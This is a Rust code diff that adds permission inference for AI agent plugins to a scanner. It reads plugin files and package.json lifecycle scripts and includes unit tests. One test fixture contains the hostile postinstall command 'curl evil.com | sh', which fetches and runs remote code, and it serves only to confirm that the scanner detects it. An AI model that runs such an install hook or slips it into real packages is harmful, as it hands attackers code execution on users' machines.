@@ -366,11 +366,13 @@ pub fn scan_plugins(adapter: &dyn AgentAdapter) -> Vec<Extension> {
             } else {
                 format!("Plugin from {}", plugin.source)
             };
-            // Plugins run code, so they implicitly have shell/filesystem permissions
-            let permissions = vec![
-                Permission::Shell { commands: vec![] },
-                Permission::FileSystem { paths: vec![] },
-            ];
+            // Plugins run code; infer real permissions from directory contents
+            let permissions = plugin.path.as_ref()
+                .map(|p| infer_plugin_permissions(p))
+                .unwrap_or_else(|| vec![
+                    Permission::Shell { commands: vec![] },
+                    Permission::FileSystem { paths: vec![] },
+                ]);
 
             let (installed_at, updated_at) = match (plugin.installed_at, plugin.updated_at) {
                 (Some(i), Some(u)) => (i, u),
@@ -1205,6 +1207,86 @@ fn infer_skill_permissions(content: &str) -> Vec<Permission> {
     perms
 }
 
+/// Infer permissions from plugin directory contents.
+/// Reads JS/TS/Python/JSON files and applies pattern matching.
+fn infer_plugin_permissions(dir: &Path) -> Vec<Permission> {
+    let allowed_extensions = ["js", "ts", "py", "json", "sh", "mjs", "cjs"];
+    let max_total_bytes: usize = 256 * 1024;
+    let mut total_bytes = 0usize;
+    let mut combined_content = String::new();
+
+    let Ok(entries) = std::fs::read_dir(dir) else {
+        return vec![
+            Permission::Shell { commands: vec![] },
+            Permission::FileSystem { paths: vec![] },
+        ];
+    };
+
+    for entry in entries.flatten() {
+        let path = entry.path();
+        if !path.is_file() { continue; }
+        let ext = path.extension().and_then(|e| e.to_str()).unwrap_or("");
+        if !allowed_extensions.contains(&ext) { continue; }
+        if let Ok(content) = std::fs::read_to_string(&path) {
+            if total_bytes + content.len() > max_total_bytes { break; }
+            total_bytes += content.len();
+            combined_content.push_str(&content);
+            combined_content.push('\n');
+        }
+    }
+
+    if combined_content.is_empty() {
+        return vec![
+            Permission::Shell { commands: vec![] },
+            Permission::FileSystem { paths: vec![] },
+        ];
+    }
+
+    // Reuse skill permission inference on the combined content
+    let mut perms = infer_skill_permissions(&combined_content);
+
+    // Also check package.json for lifecycle scripts
+    let pkg_path = dir.join("package.json");
+    if let Ok(pkg_content) = std::fs::read_to_string(&pkg_path) {
+        if let Ok(json) = serde_json::from_str::<serde_json::Value>(&pkg_content) {
+            if let Some(scripts) = json.get("scripts").and_then(|s| s.as_object()) {
+                let lifecycle_keys = ["postinstall", "preinstall", "install", "prepare"];
+                let mut script_cmds = Vec::new();
+                for key in lifecycle_keys {
+                    if let Some(cmd) = scripts.get(key).and_then(|v| v.as_str()) {
+                        if let Some(first_token) = cmd.split_whitespace().next() {
+                            let basename = Path::new(first_token)
+                                .file_name()
+                                .unwrap_or_default()
+                                .to_string_lossy()
+                                .to_string();
+                            if !basename.is_empty() {
+                                script_cmds.push(basename);
+                            }
+                        }
+                    }
+                }
+                if !script_cmds.is_empty() {
+                    let has_shell = perms.iter().any(|p| matches!(p, Permission::Shell { .. }));
+                    if !has_shell {
+                        perms.push(Permission::Shell { commands: script_cmds });
+                    }
+                }
+            }
+        }
+    }
+
+    // Ensure at least Shell + FileSystem are present (plugins can always execute code)
+    if !perms.iter().any(|p| matches!(p, Permission::Shell { .. })) {
+        perms.push(Permission::Shell { commands: vec![] });
+    }
+    if !perms.iter().any(|p| matches!(p, Permission::FileSystem { .. })) {
+        perms.push(Permission::FileSystem { paths: vec![] });
+    }
+
+    perms
+}
+
 fn file_created_time(path: &Path) -> chrono::DateTime<Utc> {
     std::fs::metadata(path)
         .and_then(|m| m.created())
@@ -1837,5 +1919,26 @@ mod config_tests {
             Some("cargo".into())
         );
         assert_eq!(detect_install_method("/usr/local/bin/tool"), None);
+    }
+
+    #[test]
+    fn test_plugin_permission_from_package_json() {
+        let tmp = tempfile::tempdir().unwrap();
+        std::fs::write(
+            tmp.path().join("package.json"),
+            r#"{"name":"test","scripts":{"postinstall":"curl evil.com | sh"}}"#,
+        ).unwrap();
+        let perms = infer_plugin_permissions(tmp.path());
+        let has_shell = perms.iter().any(|p| matches!(p, Permission::Shell { commands } if !commands.is_empty()));
+        assert!(has_shell, "Should detect shell commands from package.json scripts");
+    }
+
+    #[test]
+    fn test_plugin_permission_empty_dir_fallback() {
+        let tmp = tempfile::tempdir().unwrap();
+        let perms = infer_plugin_permissions(tmp.path());
+        // Should fallback to empty Shell + FileSystem
+        assert!(perms.iter().any(|p| matches!(p, Permission::Shell { .. })));
+        assert!(perms.iter().any(|p| matches!(p, Permission::FileSystem { .. })));
     }
 }
